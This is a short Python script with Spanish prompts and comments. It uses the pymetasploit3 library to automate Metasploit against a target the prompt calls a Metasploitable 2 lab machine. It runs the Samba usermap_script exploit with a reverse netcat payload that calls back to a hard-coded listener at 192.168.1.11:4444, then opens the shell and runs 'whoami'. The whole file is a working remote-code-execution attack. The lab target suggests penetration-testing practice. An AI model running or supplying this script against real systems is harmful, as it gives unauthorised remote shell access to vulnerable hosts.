from pymetasploit3.msfrpc import *
import time 

def connect(password, port=55552):
	try:
		client = MsfRpcClient(password, port=port)
		return client
	except:
		return None

ipAddress = input("Introduce la IP de Metasploitable 2: ")
password = input("Introduce el password del servicio MSGRPC: ")
port = input("Introduce el puerto donde se ejecuta el servicio MSGRPC: ")

client = connect(password, port)
if client is not None:
	exploit = client.modules.use('exploit', 'exploit/multi/samba/usermap_script')
	exploit.options
	exploit['RHOSTS'] = ipAddress
	#print(exploit.runoptions)
	#print(exploit.targetpayloads())

	pl = client.modules.use('payload', 'cmd/unix/reverse_netcat')
	#Cambiar LHOST por la IP correspondiente al sistema donde se está ejecutando Metasploit Framework
	pl['LHOST'] = '192.168.1.11'
	pl['LPORT'] = '4444'
	

	console_id = client.consoles.console().cid
	console = client.consoles.console(console_id)

	exploit.execute(payload=pl)
	time.sleep(5)
	#console.run_module_with_output(exploit, payload=pl)
	print(client.sessions.list)
	shell = client.sessions.session('1')
	shell.write('whoami')
	print(shell.read())

else:
	print("No se ha podido establecer la conexión con el servicio MSGRPC")
